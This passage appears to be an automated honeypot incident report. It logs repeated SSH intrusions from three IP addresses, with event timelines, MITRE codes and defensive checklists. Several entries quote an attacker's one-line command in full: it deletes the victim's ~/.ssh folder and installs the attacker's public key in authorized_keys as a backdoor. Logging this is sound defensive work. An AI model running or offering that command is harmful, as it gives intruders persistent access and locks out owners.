| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:04:54` | `cowrie.session.connect` |
| `2026-05-04 16:04:54` | `cowrie.client.version` |
| `2026-05-04 16:04:54` | `cowrie.client.kex` |
| `2026-05-04 16:04:54` | `cowrie.login.success` |
| `2026-05-04 16:04:54` | `cowrie.session.params` |
| `2026-05-04 16:04:54` | `cowrie.command.input` |
| `2026-05-04 16:04:54` | `cowrie.command.failed` |
| `2026-05-04 16:04:54` | `cowrie.log.closed` |
| `2026-05-04 16:04:54` | `cowrie.session.params` |
| `2026-05-04 16:04:54` | `cowrie.command.input` |
| `2026-05-04 16:04:55` | `cowrie.session.file_download` |
| `2026-05-04 16:04:55` | `cowrie.log.closed` |
| `2026-05-04 16:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60ba31dfa745

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-05-04 16:04 |
| **Last Seen** | 2026-05-04 16:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:04:56` | `cowrie.session.connect` |
| `2026-05-04 16:04:56` | `cowrie.client.version` |
| `2026-05-04 16:04:56` | `cowrie.client.kex` |
| `2026-05-04 16:04:57` | `cowrie.login.success` |
| `2026-05-04 16:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d920221cab9

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:04 |
| **Last Seen** | 2026-05-04 16:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:04:57` | `cowrie.session.connect` |
| `2026-05-04 16:04:57` | `cowrie.client.version` |
| `2026-05-04 16:04:57` | `cowrie.client.kex` |
| `2026-05-04 16:04:58` | `cowrie.login.success` |
| `2026-05-04 16:04:58` | `cowrie.session.params` |
| `2026-05-04 16:04:58` | `cowrie.command.input` |
| `2026-05-04 16:04:58` | `cowrie.command.failed` |
| `2026-05-04 16:04:58` | `cowrie.log.closed` |
| `2026-05-04 16:04:59` | `cowrie.session.params` |
| `2026-05-04 16:04:59` | `cowrie.command.input` |
| `2026-05-04 16:04:59` | `cowrie.session.file_download` |
| `2026-05-04 16:04:59` | `cowrie.log.closed` |
| `2026-05-04 16:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b499491fe5

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:05 |
| **Last Seen** | 2026-05-04 16:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:05:01` | `cowrie.session.connect` |
| `2026-05-04 16:05:01` | `cowrie.client.version` |
| `2026-05-04 16:05:01` | `cowrie.client.kex` |
| `2026-05-04 16:05:02` | `cowrie.login.success` |
| `2026-05-04 16:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e1e7946a727

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:09 |
| **Last Seen** | 2026-05-04 16:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:09:40` | `cowrie.session.connect` |
| `2026-05-04 16:09:40` | `cowrie.client.version` |
| `2026-05-04 16:09:41` | `cowrie.client.kex` |
| `2026-05-04 16:09:41` | `cowrie.login.success` |
| `2026-05-04 16:09:41` | `cowrie.session.params` |
| `2026-05-04 16:09:41` | `cowrie.command.input` |
| `2026-05-04 16:09:41` | `cowrie.command.failed` |
| `2026-05-04 16:09:42` | `cowrie.log.closed` |
| `2026-05-04 16:09:42` | `cowrie.session.params` |
| `2026-05-04 16:09:42` | `cowrie.command.input` |
| `2026-05-04 16:09:42` | `cowrie.session.file_download` |
| `2026-05-04 16:09:42` | `cowrie.log.closed` |
| `2026-05-04 16:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b3d4bc781ce

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:09 |
| **Last Seen** | 2026-05-04 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:09:44` | `cowrie.session.connect` |
| `2026-05-04 16:09:44` | `cowrie.client.version` |
| `2026-05-04 16:09:44` | `cowrie.client.kex` |
| `2026-05-04 16:09:45` | `cowrie.login.success` |
| `2026-05-04 16:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c72544dff9

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:11 |
| **Last Seen** | 2026-05-04 16:11 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:11:37` | `cowrie.session.connect` |
| `2026-05-04 16:11:37` | `cowrie.client.version` |
| `2026-05-04 16:11:37` | `cowrie.client.kex` |
| `2026-05-04 16:11:39` | `cowrie.login.success` |
| `2026-05-04 16:11:40` | `cowrie.session.params` |
| `2026-05-04 16:11:40` | `cowrie.command.input` |
| `2026-05-04 16:11:40` | `cowrie.command.failed` |
| `2026-05-04 16:11:40` | `cowrie.log.closed` |
| `2026-05-04 16:11:41` | `cowrie.session.params` |
| `2026-05-04 16:11:41` | `cowrie.command.input` |
| `2026-05-04 16:11:41` | `cowrie.session.file_download` |
| `2026-05-04 16:11:41` | `cowrie.log.closed` |
| `2026-05-04 16:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca33d091748

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:11 |
| **Last Seen** | 2026-05-04 16:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:11:45` | `cowrie.session.connect` |
| `2026-05-04 16:11:45` | `cowrie.client.version` |
| `2026-05-04 16:11:45` | `cowrie.client.kex` |
| `2026-05-04 16:11:48` | `cowrie.login.success` |
| `2026-05-04 16:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c4e76ab532

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:12 |
| **Last Seen** | 2026-05-04 16:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:12:45` | `cowrie.session.connect` |
| `2026-05-04 16:12:45` | `cowrie.client.version` |
| `2026-05-04 16:12:45` | `cowrie.client.kex` |
| `2026-05-04 16:12:46` | `cowrie.login.success` |
| `2026-05-04 16:12:47` | `cowrie.session.params` |
| `2026-05-04 16:12:47` | `cowrie.command.input` |
| `2026-05-04 16:12:47` | `cowrie.command.failed` |
| `2026-05-04 16:12:47` | `cowrie.log.closed` |
| `2026-05-04 16:12:48` | `cowrie.session.params` |
| `2026-05-04 16:12:48` | `cowrie.command.input` |
| `2026-05-04 16:12:48` | `cowrie.session.file_download` |
| `2026-05-04 16:12:48` | `cowrie.log.closed` |
| `2026-05-04 16:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4237a8fe18

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:12 |
| **Last Seen** | 2026-05-04 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:12:51` | `cowrie.session.connect` |
| `2026-05-04 16:12:51` | `cowrie.client.version` |
| `2026-05-04 16:12:52` | `cowrie.client.kex` |
| `2026-05-04 16:12:53` | `cowrie.login.success` |
| `2026-05-04 16:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4be20963d83f

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:13 |
| **Last Seen** | 2026-05-04 16:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:13:52` | `cowrie.session.connect` |
| `2026-05-04 16:13:52` | `cowrie.client.version` |
| `2026-05-04 16:13:52` | `cowrie.client.kex` |
| `2026-05-04 16:13:54` | `cowrie.login.success` |
| `2026-05-04 16:13:54` | `cowrie.session.params` |
| `2026-05-04 16:13:54` | `cowrie.command.input` |
| `2026-05-04 16:13:54` | `cowrie.command.failed` |
| `2026-05-04 16:13:55` | `cowrie.log.closed` |
| `2026-05-04 16:13:55` | `cowrie.session.params` |
| `2026-05-04 16:13:55` | `cowrie.command.input` |
| `2026-05-04 16:13:56` | `cowrie.session.file_download` |
| `2026-05-04 16:13:56` | `cowrie.log.closed` |
| `2026-05-04 16:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dff5873d4b5

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:13 |
| **Last Seen** | 2026-05-04 16:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:13:59` | `cowrie.session.connect` |
| `2026-05-04 16:13:59` | `cowrie.client.version` |
| `2026-05-04 16:13:59` | `cowrie.client.kex` |
| `2026-05-04 16:14:01` | `cowrie.login.success` |
| `2026-05-04 16:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b47ecbc6907

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:14 |
| **Last Seen** | 2026-05-04 16:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:14:24` | `cowrie.session.connect` |
| `2026-05-04 16:14:24` | `cowrie.client.version` |
| `2026-05-04 16:14:24` | `cowrie.client.kex` |
| `2026-05-04 16:14:25` | `cowrie.login.success` |
| `2026-05-04 16:14:25` | `cowrie.session.params` |
| `2026-05-04 16:14:25` | `cowrie.command.input` |
| `2026-05-04 16:14:25` | `cowrie.command.failed` |
| `2026-05-04 16:14:25` | `cowrie.log.closed` |
| `2026-05-04 16:14:26` | `cowrie.session.params` |
| `2026-05-04 16:14:26` | `cowrie.command.input` |
| `2026-05-04 16:14:26` | `cowrie.session.file_download` |
| `2026-05-04 16:14:26` | `cowrie.log.closed` |
| `2026-05-04 16:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b9f37ab327

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:14 |
| **Last Seen** | 2026-05-04 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:14:28` | `cowrie.session.connect` |
| `2026-05-04 16:14:28` | `cowrie.client.version` |
| `2026-05-04 16:14:28` | `cowrie.client.kex` |
| `2026-05-04 16:14:29` | `cowrie.login.success` |
| `2026-05-04 16:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b40b023740a7

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:16 |
| **Last Seen** | 2026-05-04 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:16:04` | `cowrie.session.connect` |
| `2026-05-04 16:16:04` | `cowrie.client.version` |
| `2026-05-04 16:16:05` | `cowrie.client.kex` |
| `2026-05-04 16:16:06` | `cowrie.login.success` |
| `2026-05-04 16:16:07` | `cowrie.session.params` |
| `2026-05-04 16:16:07` | `cowrie.command.input` |
| `2026-05-04 16:16:07` | `cowrie.command.failed` |
| `2026-05-04 16:16:07` | `cowrie.log.closed` |
| `2026-05-04 16:16:08` | `cowrie.session.params` |
| `2026-05-04 16:16:08` | `cowrie.command.input` |
| `2026-05-04 16:16:08` | `cowrie.session.file_download` |
| `2026-05-04 16:16:08` | `cowrie.log.closed` |
| `2026-05-04 16:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-547f66c408c2

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:16 |
| **Last Seen** | 2026-05-04 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:16:11` | `cowrie.session.connect` |
| `2026-05-04 16:16:11` | `cowrie.client.version` |
| `2026-05-04 16:16:11` | `cowrie.client.kex` |
| `2026-05-04 16:16:13` | `cowrie.login.success` |
| `2026-05-04 16:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9f130b789df

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-05-04 16:16 |
| **Last Seen** | 2026-05-04 16:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:16:28` | `cowrie.session.connect` |
| `2026-05-04 16:16:28` | `cowrie.client.version` |
| `2026-05-04 16:16:28` | `cowrie.client.kex` |
| `2026-05-04 16:16:29` | `cowrie.login.success` |
| `2026-05-04 16:16:29` | `cowrie.session.params` |
